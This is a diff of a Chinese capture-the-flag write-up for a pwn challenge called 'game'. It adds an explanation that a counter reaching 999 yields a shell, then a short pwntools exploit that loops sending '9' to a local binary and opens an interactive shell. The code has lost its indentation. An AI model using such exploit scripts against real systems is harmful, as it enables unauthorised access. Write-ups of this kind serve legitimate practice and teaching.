@@ -37,4 +37,40 @@ flag:
 # game
 
 ![[Pasted image 20250115092751.png]]
-反编译后可以看出当local_14l
+反编译后可以看出当local_14累加到999后就可以获取shell。
+exp:
+```python
+from pwn import *
+
+  
+
+context(os="linux", arch="amd64", log_level="debug")
+
+local = True
+
+if local:
+
+p = process("./game")
+
+# pwnlib.gdb.attach(p, 'b *main')
+
+else:
+
+pass
+
+  
+
+num = 0
+
+# p.recvuntil(b"Let's paly a game!")
+
+while num<=999:
+
+p.sendlineafter(b'pls input you num:', b'9')
+
+num += 9
+
+p.interactive()
+```
+flag:
+![[Pasted image 20250115092855.png]]
